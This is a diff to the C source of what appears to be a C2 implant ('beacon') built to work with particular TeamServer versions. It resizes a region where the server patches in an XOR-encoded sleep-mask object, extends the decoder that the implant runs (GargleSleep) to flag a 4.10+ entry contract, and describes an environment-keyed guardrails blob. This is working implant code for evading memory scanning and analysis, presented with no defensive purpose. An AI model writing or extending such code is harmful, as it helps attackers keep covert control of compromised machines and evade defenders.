@@ -110,20 +110,29 @@ char myargs[PATCH_SIZE] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMN
 /* 4.9.1 template regions. The 4.9.1 TeamServer patches these magic placeholders
  * by file-wide string search (BeaconPayload.indexOf / replaceAt):
  *
- *   SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK -> 16384-byte sleep-mask blob (patchSleepMaskString
+ *   SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK -> the sleep-mask object (patchSleepMaskString
  *     has NO missing-magic guard, so payload generation hard-fails without it).
- *     The blob is the official BOF sleep mask. GargleSleep XOR-decodes it
- *     (key at [0:4], BE length at [4:8] unxored, payload from 8) and runs
- *     it via command_inline_execute_object_parsed with the sleep time as
- *     a 4-byte BE integer argument. Unpatched SSSS falls back to the 4.5
- *     trampoline.
+ *     Behind the 32-byte marker this source states, in decimal digits, how
+ *     many bytes the TS patches here (SLEEPMASK_REGION_PATCH); a sleeve built
+ *     before that has a NUL there and the TS falls back to 16384. The patch:
+ *     [XOR key 4][BE object length; bit 31 = the object speaks the 4.10+
+ *     sleep_mask(BEACON_INFO *, FUNCTION_CALL *) entry][object XOR key][random
+ *     padding]. sleepmask_decode() is its inverse; GargleSleep runs the
+ *     object. Unpatched SSSS falls back to the 4.5 trampoline.
  *
  *   GGGGuuuu...dddd -> 2048-byte BeaconGuardrails blob. applyPatch is optional
  *     on the TS (skips if magic is absent). When patched, settings_init reverses
  *     the env XOR chain and checksum before parsing. Unpatched magic = no-op.
  *
  * The 4.5 TeamServer ignores both regions, so one binary serves 4.5 and 4.9.1. */
-char sleepmask_region[16416] = "SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK";
+#ifndef SLEEPMASK_REGION_PATCH
+#define SLEEPMASK_REGION_PATCH 16384
+#endif
+#define SM_STR_(x) #x
+#define SM_STR(x) SM_STR_(x)
+/* the beacon's x64 sleeve publishes 65536 (beacon.vcxproj); every other
+ * build keeps the original 16384 */
+char sleepmask_region[48 + SLEEPMASK_REGION_PATCH] = "SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK" SM_STR(SLEEPMASK_REGION_PATCH);
 char guard_region[2112] = "GGGGuuuuaaaarrrrddddRRRRaaaaiiiillllssssPPPPaaaayyyyllllooooaaaadddd";
 
 /*
@@ -140,10 +149,14 @@ static int guard_region_is_unpatched(void) {
 	return memcmp(guard_region, a, 32) == 0 && memcmp(guard_region + 32, b, 36) == 0;
 }
 
-/* Inverse of BeaconPayload.patchSleepMaskString: [0:4]=XOR key (1..252),
- * [4:8]=BE payload length left in the clear, [8:]=payload XOR key[i%4].
- * Unpatched SSSSLLLL… returns 0 so GargleSleep uses the 4.5 trampoline. */
-int sleepmask_decode(char * out, int max) {
+/* Inverse of BeaconPayload.buildSleepMaskPatch: [0:4]=XOR key (1..252),
+ * [4:8]=BE object length in the clear with bit 31 marking the 4.10+ entry
+ * contract, [8:]=object XOR key[i%4]. *contract410 (may be NULL) takes the
+ * flag. Unpatched SSSSLLLL… returns 0 so GargleSleep uses the 4.5
+ * trampoline. */
+#define SLEEPMASK_CONTRACT_410 0x80000000
+
+int sleepmask_decode(char * out, int max, int * contract410) {
 	unsigned char * r = (unsigned char *)sleepmask_region;
 	unsigned char key[4];
 	unsigned int len;
@@ -155,12 +168,26 @@ int sleepmask_decode(char * out, int max) {
 	key[0] = r[0]; key[1] = r[1]; key[2] = r[2]; key[3] = r[3];
 	memcpy(&len, r + 4, 4);
 	len = ntohl(len);
-	if (len == 0 || len > 16376 || (int)len > max)
+	if (contract410 != NULL)
+		*contract410 = (len & SLEEPMASK_CONTRACT_410) != 0;
+	len &= ~SLEEPMASK_CONTRACT_410;
+	if (len == 0 || len > SLEEPMASK_REGION_PATCH - 8 || (int)len > max)
 		return 0;
 	memcpy(out, r + 8, len);
 	for (i = 0; i < len; i++)
 		out[i] = (char)(out[i] ^ key[i % 4]);
 	return (int)len;
+}
+
+/* Does the region hold an object for the 4.10+ entry contract? (The flag
+ * without the decode.) */
+int sleepmask_contract(void) {
+	unsigned char * r = (unsigned char *)sleepmask_region;
+	unsigned int len;
+	if (r[0] == 'S' && r[1] == 'S' && r[2] == 'S' && r[3] == 'S')
+		return 0;
+	memcpy(&len, r + 4, 4);
+	return (ntohl(len) & SLEEPMASK_CONTRACT_410) != 0;
 }
 
 unsigned short setting_short(int field) {
